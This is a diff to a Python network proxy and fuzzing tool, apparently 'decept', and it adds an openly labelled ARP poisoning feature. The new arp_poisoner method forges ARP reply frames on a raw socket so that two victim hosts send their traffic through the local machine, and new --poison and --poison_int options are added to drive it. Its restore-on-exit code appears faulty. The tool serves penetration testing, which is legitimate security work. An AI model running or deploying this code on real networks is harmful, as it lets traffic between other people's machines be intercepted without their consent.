@@ -66,7 +66,7 @@ except:
 
 from ctypes import *
 from re import match
-from time import time
+from time import time,sleep
 from datetime import datetime
 
 from os.path import join,isfile,abspath
@@ -176,6 +176,8 @@ class DeceptProxy():
     
         self.hostconf_dict = {}
 
+        self.poison_file = ""
+        self.poison_int = "eth0"
                         
         self.local_certfile=local_cert
         self.local_keyfile=local_key
@@ -502,6 +504,16 @@ class DeceptProxy():
         if self.fuzz_file: 
             self.fuzzerData = mutiny.FuzzerData()
 
+        if self.poison_file:
+            poison_thread = multiprocessing.Process(target = self.arp_poisoner,
+                                                    args = (self.poison_file,
+                                                            self.poison_int,
+                                                            self.killswitch))
+            poison_thread.start()
+
+            
+
+
         # attempt to parse config file, if any. Should be located in 'rhost'
         # will continue if not found.
         try:
@@ -529,6 +541,9 @@ class DeceptProxy():
         except Exception as e:
             print e
             pass
+
+
+
 
 
         #! Todo, no loop for UDP...
@@ -1260,6 +1275,98 @@ class DeceptProxy():
         pcap_fd.close()
 
 
+    def arp_poisoner(self,config_file,interface,killswitch):
+
+        arp_poison_list = []
+        
+        try:
+            confbuf = ""
+            conflist = []
+            with open(config_file,"r") as f:
+                confbuf = f.read() 
+            for line in filter(None,confbuf.split("\n")): 
+                if line[0] != "#":
+                    conflist.append(line)
+
+            if len(conflist) > 0:
+                for entry in conflist:
+                    try:
+                        mac1,mac2,ip1,ip2 = entry.split("|") 
+                        if len(mac1) and len(mac2) and len(ip1) and len(ip2):
+                            output("[!.!] Poisoning %s | %s | %s | %s" % (mac1,mac2,ip1,ip2),PURPLE)
+                            
+                            m1 = ''.join(chr(int(c,16)) for c in mac1.split(":"))
+                            m2 = ''.join(chr(int(c,16)) for c in mac2.split(":"))
+                            ip1 = ''.join(chr(int(c,10)) for c in ip1.split("."))
+                            ip2 = ''.join(chr(int(c,10)) for c in ip2.split("."))
+                            arp_poison_list.append((m1,m2,ip1,ip2))
+                    except Exception as e:
+                        print e
+                        pass
+        except IOError as e:
+            # no such file
+            pass
+        except Exception as e:
+            print e
+            pass
+
+
+        poison_sock = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,0x300)
+        LOCAL_MAC_IOCTL = fcntl.ioctl(poison_sock.fileno(),0x8927,struct.pack('256s',interface[0:15]))
+        LOCAL_MAC = LOCAL_MAC_IOCTL[18:24]
+
+        #buf = dst_addr + src_addr 
+        buf =  "??????" + "!!!!!!"
+        buf += "\x08\x06" # arp
+        buf += "\x00\x01" #ethernet
+        buf += "\x08\x00" #ipv4
+        buf += "\x06" # hardware size
+        buf += "\x04" # protocol size
+        buf += "\x00\x02" # arp opcode (reply)
+        #buf += our_mac # 
+        #buf += our_IP  # 
+        #buf += target_mac #
+        #buf += target_IP  # 
+
+        while not killswitch.is_set():
+            try:
+                for mac1,mac2,ip1,ip2 in arp_poison_list:
+                    frame1 = buf.replace("??????",mac1) #dst
+                    frame1 = frame1.replace("!!!!!!",LOCAL_MAC) #src
+                    frame1 += LOCAL_MAC 
+                    frame1 += ip2 
+                    frame1 += mac1 
+                    frame1 += ip1
+                    ret = poison_sock.sendto(frame1,(interface,0x0))
+
+                    frame2 = buf.replace("??????",mac2) #dst
+                    frame2 = frame2.replace("!!!!!!",LOCAL_MAC) #src
+                    frame2 += LOCAL_MAC 
+                    frame2 += ip1 
+                    frame2 += mac2 
+                    frame2 += ip2
+                    ret = poison_sock.sendto(frame2,(interface,0x0))
+                sleep(2)
+
+            except KeyboardInterrupt:
+                # do some fixup (hopefully)
+                frame1 = buf.replace("??????",mac1) #dst
+                frame1 = frame1.replace("!!!!!!",mac2) #src
+                frame1 += mac2 
+                frame1 += ip2 
+                frame1 += mac1 
+                frame1 += ip1
+                ret = poison_sock.sendto(frame1,(interface,0x0))
+
+                frame2 = buf.replace("??????",mac2) #dst
+                frame2 = frame1.replace("!!!!!!",mac1) #src
+                frame2 += mac1 
+                frame2 += ip1 
+                frame2 += mac2 
+                frame2 += ip2
+                ret = poison_sock.sendto(frame2,(interface,0x0))
+                return
+
     def inbound_handler(self,inbound,src="",dst=""):
         #write_packet_header(inbound,src,dst)
         self.write_packet_data(inbound,1) 
@@ -1354,6 +1461,10 @@ class DeceptProxy():
                 data_chunk = data[send_count:]
 
             send_count += sock.sendto(data_chunk,dst_tuple)
+
+    
+
+
 
 #####################################################
 ### End class DeceptProxy() 
@@ -1451,6 +1562,7 @@ def main():
 
     if (rport == lport) and (rhost == lhost) and "--really" not in sys.argv:
         output("[>_>] Really? If you really want to see this, use with --really flag",YELLOW) 
+        output("[<_<] Protip: it's not pretty",PURPLE)
         sys.exit()
 
     
@@ -1505,6 +1617,8 @@ def main():
             proxy.remote_keyfile = tmp_key 
             proxy.remote_certfile = tmp_cert 
        
+        proxy.poison_file  = dumb_arg_helper("--poison")
+        proxy.poison_int = dumb_arg_helper("--poison_int")
         
 
         proxy.remote_verify = dumb_arg_helper("--rverify")
@@ -1724,6 +1838,10 @@ L2 Usage: decept.py lo 00:00:00:00:00:00 eth0 ff:aa:cc:ee:dd:00
 Unix: decept.py localsocketname 0 remotesocketname 0 
 Abstract: decept.py \\x00localsocketname 0 \\x00remotesocketname 0
 
+Arp Poisoning options:
+    --poison     <config-file>    Contains "mac1|mac2|ip1|ip2" to poison.
+    --poison_int <interface>      Interface on which to poison (eth0 default)
+
 '''
 
 ValidCmdlineOptions = ["--recv_first","--timeout","--loglast",
@@ -1735,7 +1853,7 @@ ValidCmdlineOptions = ["--recv_first","--timeout","--loglast",
                        "--quiet","--dont_kill","--udppr",
                        "--expect","--really",
                        "--lcert","--lkey","--rcert","--rkey",
-                       "--rverify"]
+                       "--rverify","--poison","--poison_int"]
 
 #####################################
 ## Global header for pcap file
